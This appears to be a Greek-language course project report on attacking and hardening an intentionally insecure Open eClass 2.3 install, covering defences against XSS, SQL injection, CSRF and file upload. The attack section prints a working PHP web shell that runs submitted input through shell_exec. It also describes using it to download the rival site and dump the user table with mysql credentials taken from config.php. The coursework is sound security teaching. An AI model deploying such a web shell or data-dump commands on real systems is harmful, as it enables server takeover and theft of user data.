## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://crypto.di.uoa.gr/csec/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


## 2020 Project 1

Εκφώνηση: https://crypto.di.uoa.gr/csec/assets/projects/project1.pdf


### Μέλη ομάδας

- 1115201300202, Κώστας Χατζόπουλος
- 1115201600141, Βασίλειος Πουλόπουλος

### Report

## Όνομα ομάδας: hackerz

## Άμυνα

### Cross Site Scripting
Tο **openeclass** δεν ήταν σχεδόν καθόλου προστατευμένο από επιθέσεις αυτού του τύπου. Χρησιμοποιήσαμε την βιβλιοθήκη **htmlpurifier** (Η **htmlpurifier** εντοπίζει τον κακόβουλο κώδικα και τον αφαιρεί.) για να προστατέψουμε τις εισόδους απο link που αποθηκεύονται στην server μεταβλητή **php_self** αλλά και για τις μεταβλητές που προέρχονται από είσοδο (**GET**/**POST**) και τυπώνεται το περιεχόμενό τους στον ιστότοπο. Τα δεδομένα που έρχονται από είσοδο του χρήστη και αποθηκεύονται στη βάση, πλέον δεν περιέχουν τον κακόβουλο κώδικα.

### Sql Injection
Το **openeclass** δεν είχε σε κανένα σημείο **prepared statements** αλλά σε κάποια queries γινόταν χρήση των συναρτήσεων **mysql_real_escape_string()**, **autoquote()**, **addslashes()** και **intval()** τα οποία δεν προστατεύουν πλήρως τον ιστότοπο ενώ σε κάποια άλλα δεν υπήρχε καθόλου προστασία. Χρησιμοποιούμε την συνάρτηση **intval()** όταν στο query υπήρχαν  μόνο ακέραιοι αριθμοί και όταν υπήρχαν και strings αντικαταστήσαμε τα αρχικά queries με **prepared statements**.



### Cross-Site Request Forgery

Στο openeclass δεν υπήρχε καμία προστασία για επιθέσεις αυτού του τύπου. Για να το διορθώσουμε βάλαμε σε κάθε ενέργεια που θα μπορούσε να γίνει κάτι σημαντικό (π.χ. διαγραφές, εισαγωγές, ενημερώσεις) ένα **random token** το οποίο ελέγχεται όταν γινει η ενέργεια μέσω της μεταβλητής **$_SESSION['form_token']** που σημαίνει ότι πριν τυπωθεί η συγκεκριμένη ενέργεια αποθηκεύεται το token. Αν το token είναι διαφορετικό η ενέργεια δεν γίνεται και ο χρήστης ανακατευθύνεται στην σελίδα που ήταν.  

### Remote File Injection

Για τις επιθέσεις RFI σε σημεία που μπορούσαν να ανέβουν αρχεία (**Ανταλλαγή Αρχείων**, **Εργασίες**) ο επιτιθέμενος μπορούσε να ανοίξει το φάκελο στον οποίο αποθηκεύονταν τα αρχεία. Με αυτόν τον τρόπο θα μπορούσε να ανεβάσει κάποιο malicious script και πατώντας πάνω στο αρχείο του να το τρέξει. Για να προστατευτεί το site όταν ανεβαίνουν αρχεία το όνομα άλλαζε και γινόταν random. Αυτό δεν βοηθάει πολύ γιατί εφόσον ο επιτιθέμενος έχει πρόσβαση στο φάκελο μπορεί με διάφορους τρόπους να βρει το αρχείο του (π.χ. με το να μπει κατευθείαν αφού το ανεβάσει στο φάκελο και να πατήσει "last modified"). Για να αποτρέψουμε τις επιθέσεις RFI βάλαμε την εντολή **#Deny from All** σε **.htaccess** αρχεία σε αυτούς τους φακέλους που απαγορεύουν την πρόσβαση σε αυτούς μέσω του site.  Έτσι αφού δεν υπάρχει πρόσβαση στο φάκελο και τα ονόματα είναι random, ο επιτιθέμενος δεν έχει τρόπο να καταλάβει ποιό είναι το αρχείο του και να μπει σε αυτό ώστε να τρέξει. Επιπλέον, ακόμα και να μπορούσε να καταλάβει πως λέγεται το αρχείο του, δεν θα έτρεχε γιατί στο **.htaccess** εχουμε προσθέσει την εντολή **#php_flag engine off** οπότε τα .php αρχεία δεν μπορούν να τρέξουν.

## Επίθεση

### Cross Site Scripting

### Sql Injection



### Cross-Site Request Forgery

### Remote File Injection
Το αντίπαλο site δεν είχε ασφάλεια για RFI οπότε ανεβασαμε στην ανταλλαγή αρχείων διάφορα .php scripts και μάθαμε την ιεραρχία των φακέλων. Στη συνέχεια αλλάξαμε το αρχείο **tool_content.css** και το **theme.html** και προσθέσαμε το **index.html** ωστε να αλλάξουμε την αρχική σελίδα. Αυτά τα αρχεία τα αλλάξαμε έχοντας φτιάξει τις version που θέλαμε, τις ανεβάσαμε στο puppies και μετά ανεβάζαμε scripts με wget και τις βάζαμε στο site. Μετά φτιάξαμε το παρακάτω script:

    <?php
    $input = '';
    if (isset($_POST['input'])) {
	    $input = $_POST['input'];
	    ?>
	    <form  method="post"  action="<?PHP $_SERVER[PHP_SELF] ?>">
	    <textarea  name="input"  rows="4"  cols="50"  value="<?php $input ?>"></textarea>
	    <input  type="submit"  name="submit"/>
	    </form>
	    <?php
	    echo "<pre style='border: 1px solid black; padding: 3px'>$input</pre>";
	    $output = shell_exec($input);
	    echo "<pre style='border: 1px solid black; padding: 3px'>$output</pre>";
    } else {
	    ?>
	    <form  method="post"  action="<?PHP $_SERVER[PHP_SELF] ?>">
	    <textarea  name="input"  rows="4"  cols="50"  value="<?php $input ?>"></textarea>
	    <input  type="submit"  name="submit"/>
	    </form>
	    <?php
    }
    ?>

 το οποίο τρέχει shell commands κατευθείαν απ' το browser μέσω φόρμας και το ανεβάσαμε. Έτσι μπορούσαμε να κάνουμε πρακτικά οτιδήποτε στο site εύκολα και χωρίς να ανεβάζουμε πολλά scripts. Με τη βοήθεια του script αυτού τρέξαμε εντολές ώστε να κάνουμε compress ολο το site, το αποθηκεύσαμε στο φάκελο στον οποίο βρισκόμασταν (εκεί που είχαν ανέβει τα scripts) και κατεβάσαμε από εκεί τον κώδικα στους υπολογιστές μας. Τότε από το config.php μάθαμε τον κωδικό της βάσης και χρησιμοποιήσαμε στο script μας την εντολή `mysql -u root --password="*********" --database=eclass --execute="SELECT * FROM user;"` οπότε αυτός ήταν ένας τρόπος να μάθουμε τα στοιχεία των χρηστών.



